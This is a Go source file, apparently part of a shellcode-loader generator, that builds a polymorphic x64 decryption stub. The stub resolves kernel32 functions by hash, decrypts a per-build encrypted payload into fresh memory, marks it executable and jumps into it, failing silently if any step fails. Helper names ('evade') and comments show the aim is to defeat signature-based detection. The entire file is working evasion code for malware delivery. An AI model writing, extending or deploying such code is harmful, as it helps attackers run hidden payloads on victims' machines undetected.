package donut

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

/*
	Core-encryption trampoline — generation-time polymorphism for the loader
	stages (design-v2 §3, sol-review R1/R4 hardened).

	Artifact layout per stage: [trampoline][key 16][core ciphertext].
	The trampoline is fully self-contained: the source pointer and the key
	are addressed RIP-relative to the end of the emitted code, so no external
	patch sites exist.

	Contract (sol-review R1 table):
	  x64 entry: RCX = instance, [RSP] = outer return address
	  x86 entry: [ESP] = outer return address, [ESP+4] = instance pointer
	On success the decrypted core is entered with EXACTLY that state:
	  - all GPRs and flags saved in the prologue are restored
	  - transfer is a balanced `push target; ret` executed after the frame
	    teardown, so the final RSP equals the entry RSP and (x86) the real
	    outer return address stays at [ESP] for the core's eventual ret
	  - the RW→RX→FlushInstructionCache sequence follows the documented W^X
	    order (lfence alone is NOT a substitute — review R4)

	Failure path (VirtualAlloc/Protect/Flush fail): full restore + plain `ret`
	to the outer caller — the stage becomes a quiet no-op rather than a crash.

	Schemes (per build, emitted raw — no compiler, no MBA folding):
	  A) rolling XOR:  c[i] = p[i] ^ k[i & 15]
	  B) rolling ADD:  c[i] = p[i] + (k[i & 15] + i) & 0xFF
	  C) MBA XOR:      decoder computes a^b as (a & ~b) | (~a & b)

	Anti-identity key validation (generation time):
	  A: every k[j] != 0
	  B: every (k[j] + i) % 256 != 0 for the positions i ≡ j (mod 16)
	     ⇔ k[j] & 15 != j  (kills the i=0,256,... leak class)
	  C: same as A
*/

type coreScheme int

const (
	schemeXOR coreScheme = iota
	schemeADD
	schemeMBA
)

// EncryptCore encrypts the loader core with a per-build scheme+key and
// returns (ciphertext, key, scheme). Anti-identity constraints enforced.
func EncryptCore(core []byte) (cipher []byte, key []byte, scheme coreScheme, err error) {
	if len(core) == 0 {
		return nil, nil, 0, fmt.Errorf("trampoline: empty core")
	}
	si, err := evadeRandInt(3)
	if err != nil {
		return nil, nil, 0, err
	}
	scheme = coreScheme(si)

	for attempt := 0; attempt < 64; attempt++ {
		key = make([]byte, 16)
		for j := range key {
			b, err := evadeRandUint32()
			if err != nil {
				return nil, nil, 0, err
			}
			key[j] = byte(b)
		}
		ok := true
		for j := 0; j < 16 && ok; j++ {
			switch scheme {
			case schemeXOR, schemeMBA:
				ok = key[j] != 0
			case schemeADD:
				// identity position for slot j: i ≡ -k[j] (mod 256) with i ≡ j (mod 16)
				// ⇔ k[j] ≡ -j (mod 16) — forbid that residue
				ok = byte(key[j]%16) != byte((16-j)%16)
			}
		}
		if !ok {
			continue
		}
		cipher = make([]byte, len(core))
		for i, p := range core {
			k := key[i&15]
			switch scheme {
			case schemeXOR, schemeMBA:
				cipher[i] = p ^ k
			case schemeADD:
				cipher[i] = p + k + byte(i)
			}
		}
		return cipher, key, scheme, nil
	}
	return nil, nil, 0, fmt.Errorf("trampoline: anti-identity key not found in 64 attempts")
}

/*
 ============================================================================
 x64 trampoline
 ============================================================================

Frame (rbp-relative), mirroring the evade stub discipline:
	[rbp-0x08] rcx      [rbp-0x28] r13
	[rbp-0x10] rdx      [rbp-0x30] r14
	[rbp-0x18] rbx      [rbp-0x38] r15
	[rbp-0x40] RFLAGS   [rbp-0x48] newPage (runtime VirtualAlloc result)

Aligned locals (rsp after and/sub, 16-aligned):
	[rsp+0x00..0x1F] shadow space
	[rsp+0x20] VirtualAlloc          [rsp+0x28] VirtualProtect
	[rsp+0x30] FlushInstructionCache [rsp+0x38] VirtualProtect old-prot OUT
	[rsp+0x40] newPage (dedicated — rsp is constant between calls, and this slot
	            must NOT overlap the old-protect OUT: with rbp 16-aligned the
	            old [rbp-0x48] newPage slot ALIASED [rsp+0x38], so VirtualProtect
	            wrote DWORD 4 (old protection) over the pointer low half and the
	            push rax; ret transfer jumped to 0x4 (fix10 fault)
*/

const (
	trStashVA  = 0x20
	trStashVP  = 0x28
	trStashFIC = 0x30
	trFrame64  = 0x50
)

// GenerateTrampoline64 emits the complete x64 stage:
// trampoline code + 16-byte key block + ciphertext appended by the caller
// immediately after the returned code (the RIP-relative references assume
// key at codeLen and ciphertext at codeLen+16).
func GenerateTrampoline64(coreLen int, key []byte, scheme coreScheme, family evadeHashFamily, seed uint32) ([]byte, error) {
	if coreLen <= 0 || coreLen > 0x00FFFFFF {
		return nil, fmt.Errorf("trampoline: bad core length %d", coreLen)
	}
	if len(key) != 16 {
		return nil, fmt.Errorf("trampoline: key must be 16 bytes")
	}

	var b bytes.Buffer
	var failFixups []int

	// ---------- prologue ----------
	b.Write([]byte{0x55})                                          // push rbp
	b.Write([]byte{0x48, 0x89, 0xE5})                              // mov rbp, rsp
	b.Write([]byte{0x51})                                          // push rcx   [rbp-0x08]
	b.Write([]byte{0x52})                                          // push rdx   [rbp-0x10]
	b.Write([]byte{0x53})                                          // push rbx   [rbp-0x18]
	b.Write([]byte{0x41, 0x54})                                    // push r12   [rbp-0x20]
	b.Write([]byte{0x41, 0x55})                                    // push r13   [rbp-0x28]
	b.Write([]byte{0x41, 0x56})                                    // push r14   [rbp-0x30]
	b.Write([]byte{0x41, 0x57})                                    // push r15   [rbp-0x38]
	b.Write([]byte{0x9C})                                          // pushfq    [rbp-0x40]
	b.Write([]byte{0x48, 0x83, 0xE4, 0xF0})                        // and rsp, -16
	b.Write([]byte{0x48, 0x81, 0xEC, trFrame64, 0x00, 0x00, 0x00}) // sub rsp, 0x40

	// ---------- resolve kernel32 + the three APIs ----------
	if err := emitModuleBase64(&b, family, seed, "kernel32.dll", regR12, &failFixups); err != nil {
		return nil, err
	}
	if err := emitExportResolve64(&b, family, seed, "VirtualAlloc", regR12, &failFixups); err != nil {
		return nil, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, trStashVA}) // mov [rsp+0x20], rbx
	if err := emitExportResolve64(&b, family, seed, "VirtualProtect", regR12, &failFixups); err != nil {
		return nil, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, trStashVP}) // mov [rsp+0x28], rbx
	if err := emitExportResolve64(&b, family, seed, "FlushInstructionCache", regR12, &failFixups); err != nil {
		return nil, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, trStashFIC}) // mov [rsp+0x30], rbx

	// ---------- VirtualAlloc(NULL, coreLen, MEM_COMMIT|RESERVE, RW) ----------
	b.Write([]byte{0x48, 0x31, 0xC9}) // xor rcx, rcx (NULL)
	b.Write([]byte{0xBA})             // mov edx, coreLen
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	b.Write([]byte{0x41, 0xB8, 0x00, 0x30, 0x00, 0x00}) // mov r8d, 0x3000
	b.Write([]byte{0x41, 0xB9, 0x04, 0x00, 0x00, 0x00}) // mov r9d, 0x04 (PAGE_READWRITE)
	b.Write([]byte{0xFF, 0x54, 0x24, trStashVA})        // call [rsp+0x20]
	b.Write([]byte{0x48, 0x85, 0xC0})                   // test rax, rax
	b.Write([]byte{0x0F, 0x84})                         // jz fail (rel32, patched)
	fail1 := b.Len()                                    // displacement field (AFTER opcode)
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fail1)
	b.Write([]byte{0x48, 0x89, 0x44, 0x24, 0x40}) // mov [rsp+0x40], rax (newPage — dedicated slot)

	// ---------- decrypt loop ----------
	// r13 = src (lea rip+disp32 → ciphertext), r14 = dst (newPage),
	// r15 = index, dl = key byte, al = data.
	srcLeaPos := b.Len()
	b.Write([]byte{0x4C, 0x8D, 0x2D, 0, 0, 0, 0}) // lea r13, [rip+disp32] (patched)
	b.Write([]byte{0x4C, 0x8B, 0x74, 0x24, 0x40}) // mov r14, [rsp+0x40] (decrypt destination)
	b.Write([]byte{0x4D, 0x31, 0xFF})             // xor r15, r15

	loopTop := b.Len()
	b.Write([]byte{0x41, 0x81, 0xFF}) // cmp r15d, coreLen
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	var jaeDone int
	b.Write([]byte{0x0F, 0x83})
	jaeDone = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))

	keyLeaPos := b.Len()
	b.Write([]byte{0x48, 0x8D, 0x15, 0, 0, 0, 0}) // lea rdx, [rip+disp32] (key, patched)
	b.Write([]byte{0x44, 0x89, 0xFB})             // mov ebx, r15d
	b.Write([]byte{0x83, 0xE3, 0x0F})             // and ebx, 15
	b.Write([]byte{0x8A, 0x14, 0x1A})             // mov dl, [rdx+rbx]  (key byte)
	b.Write([]byte{0x41, 0x8A, 0x45, 0x00})       // mov al, [r13]      (cipher byte)

	switch scheme {
	case schemeXOR:
		b.Write([]byte{0x30, 0xD0}) // xor al, dl
	case schemeADD:
		// decoder: plain = cipher - (k[j] + i). Addend into dl first, then SUB.
		// 8-BIT OPCODE DIRECTION TRAP: 02 is the REVERDED form (reg ← reg+rm);
		// the normal rm←rm+reg form is opcode 00. dl += r15b = 44 00 FA;
		// al += dl = 00 D0. (The earlier 44 02 FA / 02 D0 pair accumulated into
		// r15b and dl respectively — the loop counter raced to its bound and the
		// core shipped half-decrypted, executing ciphertext garbage.)
		b.Write([]byte{0x44, 0x00, 0xFA}) // add dl, r15b  (dl = k + i)
		b.Write([]byte{0x28, 0xD0})       // sub al, dl    (al = cipher - addend)
	case schemeMBA:
		// al ^ dl ≡ (al & ~dl) | (~al & dl) — raw emission, no optimizer folds it
		b.Write([]byte{0x88, 0xC4}) // mov ah, al   (ah = a)
		b.Write([]byte{0xF6, 0xD0}) // not al       (al = ~a)
		b.Write([]byte{0x20, 0xD0}) // and al, dl   (al = ~a & b)
		b.Write([]byte{0xF6, 0xD2}) // not dl       (dl = ~b)
		b.Write([]byte{0x20, 0xE2}) // and dl, ah   (dl = a & ~b)
		b.Write([]byte{0x08, 0xD0}) // or  al, dl   (al = a ^ b)
	}

	b.Write([]byte{0x41, 0x88, 0x46, 0x00}) // mov [r14], al — rm=110=r14 (0x45 was rm=101=r13: wrote the RX ciphertext source instead of the RW destination — run-9 fault)
	b.Write([]byte{0x49, 0xFF, 0xC5})       // inc r13
	b.Write([]byte{0x49, 0xFF, 0xC6})       // inc r14
	b.Write([]byte{0x49, 0xFF, 0xC7})       // inc r15
	var jmpLoop int
	b.Write([]byte{0xE9})
	jmpLoop = b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))

	loopDone := b.Len()
	binary.LittleEndian.PutUint32(b.Bytes()[jaeDone:jaeDone+4], uint32(loopDone-(jaeDone+4)))
	binary.LittleEndian.PutUint32(b.Bytes()[jmpLoop:jmpLoop+4], uint32(loopTop-(jmpLoop+4)))

	// ---------- VirtualProtect(newPage, coreLen, PAGE_EXECUTE_READ, &old) ----------
	b.Write([]byte{0x48, 0x8B, 0x4C, 0x24, 0x40}) // mov rcx, [rsp+0x40] (VirtualProtect base)
	b.Write([]byte{0xBA})                         // mov edx, coreLen
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	b.Write([]byte{0x41, 0xB8, 0x20, 0x00, 0x00, 0x00}) // mov r8d, 0x20 PAGE_EXECUTE_READ
	b.Write([]byte{0x4C, 0x8D, 0x4C, 0x24, 0x38})       // lea r9, [rsp+0x38] (old out)
	b.Write([]byte{0xFF, 0x54, 0x24, trStashVP})        // call [rsp+0x28]
	b.Write([]byte{0x85, 0xC0})                         // test eax, eax
	b.Write([]byte{0x0F, 0x84})
	fail2 := b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fail2)

	// ---------- FlushInstructionCache(-1, newPage, coreLen) ----------
	b.Write([]byte{0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF}) // mov rcx, -1 (pseudo process)
	b.Write([]byte{0x48, 0x8B, 0x54, 0x24, 0x40})             // mov rdx, [rsp+0x40] (FlushInstructionCache base)
	b.Write([]byte{0x41, 0xB8})                               // mov r8d, coreLen
	binary.Write(&b, binary.LittleEndian, uint32(coreLen))
	b.Write([]byte{0xFF, 0x54, 0x24, trStashFIC}) // call [rsp+0x30]
	b.Write([]byte{0x85, 0xC0})                   // test eax, eax
	b.Write([]byte{0x0F, 0x84})
	fail3 := b.Len()
	binary.Write(&b, binary.LittleEndian, uint32(0))
	failFixups = append(failFixups, fail3)

	// ---------- success epilogue: full restore + balanced push/ret ----------
	// Order matters: flags first (rcx as scratch), then rax = target LAST so it
	// survives every subsequent mov; transfer is `push rax; ret` after the
	// frame teardown so final RSP equals entry RSP.
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xC0})       // mov rcx, [rbp-0x40] (flags scratch)
	b.Write([]byte{0x51})                         // push rcx
	b.Write([]byte{0x9D})                         // popfq
	b.Write([]byte{0x48, 0x8B, 0x44, 0x24, 0x40}) // mov rax, [rsp+0x40] (core entry — dedicated slot)
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xF8})       // mov rcx, [rbp-0x08]
	b.Write([]byte{0x48, 0x8B, 0x55, 0xF0})       // mov rdx, [rbp-0x10]
	b.Write([]byte{0x48, 0x8B, 0x5D, 0xE8})       // mov rbx, [rbp-0x18]
	b.Write([]byte{0x4C, 0x8B, 0x65, 0xE0})       // mov r12, [rbp-0x20]
	b.Write([]byte{0x4C, 0x8B, 0x6D, 0xD8})       // mov r13, [rbp-0x28]
	b.Write([]byte{0x4C, 0x8B, 0x75, 0xD0})       // mov r14, [rbp-0x30]
	b.Write([]byte{0x4C, 0x8B, 0x7D, 0xC8})       // mov r15, [rbp-0x38]
	b.Write([]byte{0x48, 0x89, 0xEC})             // mov rsp, rbp
	b.Write([]byte{0x5D})                         // pop rbp
	b.Write([]byte{0x50})                         // push rax (target at [rsp-8])
	b.Write([]byte{0xC3})                         // ret  → core entry, rsp == entry rsp

	// ---------- fail path: quiet no-op return ----------
	failPos := b.Len()
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xC0}) // mov rcx, [rbp-0x40]; push; popfq
	b.Write([]byte{0x51})
	b.Write([]byte{0x9D})
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xF8}) // mov rcx, [rbp-0x08]
	b.Write([]byte{0x48, 0x8B, 0x55, 0xF0}) // mov rdx, [rbp-0x10]
	b.Write([]byte{0x48, 0x8B, 0x5D, 0xE8}) // mov rbx, [rbp-0x18]
	b.Write([]byte{0x4C, 0x8B, 0x65, 0xE0}) // mov r12, [rbp-0x20]
	b.Write([]byte{0x4C, 0x8B, 0x6D, 0xD8}) // mov r13, [rbp-0x28]
	b.Write([]byte{0x4C, 0x8B, 0x75, 0xD0}) // mov r14, [rbp-0x30]
	b.Write([]byte{0x4C, 0x8B, 0x7D, 0xC8}) // mov r15, [rbp-0x38]
	b.Write([]byte{0x48, 0x89, 0xEC})       // mov rsp, rbp
	b.Write([]byte{0x5D})                   // pop rbp
	b.Write([]byte{0xC3})                   // ret → outer caller

	// patch fail jumps
	for _, fx := range failFixups {
		binary.LittleEndian.PutUint32(b.Bytes()[fx:fx+4], uint32(failPos-(fx+4)))
	}

	// ---------- key + patch RIP-relative displacements ----------
	codeLen := b.Len()
	b.Write(key) // key at codeLen
	// src lea: rip after lea = srcLeaPos+7 → ciphertext at codeLen+16
	binary.LittleEndian.PutUint32(b.Bytes()[srcLeaPos+3:srcLeaPos+7], uint32(codeLen+16-(srcLeaPos+7)))
	// key lea: → codeLen
	binary.LittleEndian.PutUint32(b.Bytes()[keyLeaPos+3:keyLeaPos+7], uint32(codeLen-(keyLeaPos+7)))

	return b.Bytes(), nil
}
